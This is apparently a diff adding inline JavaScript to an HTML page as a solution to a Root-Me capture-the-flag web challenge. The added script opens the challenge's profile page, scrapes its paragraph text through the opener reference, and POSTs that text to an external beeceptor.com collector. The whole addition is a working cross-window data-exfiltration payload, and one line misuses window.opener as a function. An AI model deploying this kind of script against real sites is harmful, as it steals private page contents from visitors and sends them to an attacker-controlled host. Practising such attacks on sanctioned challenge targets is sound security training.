@@ -17,6 +17,34 @@
 <body id="body">
   <script>
     fetch("https://volatile.free.beeceptor.com/todos")
+      
     window.opener("http://challenge01.root-me.org:58003/login")
+
+    const redirection = window.open("http://challenge01.root-me.org:58003/profile");
+    const paragraphs = redirection.opener.document.querySelectorAll('p');
+
+    var text = ""
+      
+    paragraphs.forEach(paragraph => {
+          text = text + paragraph.textContent + "\n"
+        });
+      
+    fetch("https://volatile.free.beeceptor.com", {
+      method: "POST",  // Utiliser POST pour envoyer des données
+      headers: {
+        "Content-Type": "application/json",  // Spécifier le type de contenu
+      },
+      body: JSON.stringify({
+        text: text,  // Envoyer le texte récupéré
+      })
+    })
+      .then(response => response.json())  // Traiter la réponse
+      .then(data => {
+        console.log('Réponse du serveur:', data);
+      })
+      .catch(error => {
+        console.error('Erreur:', error);
+      });
+      
   </script>
 </body>
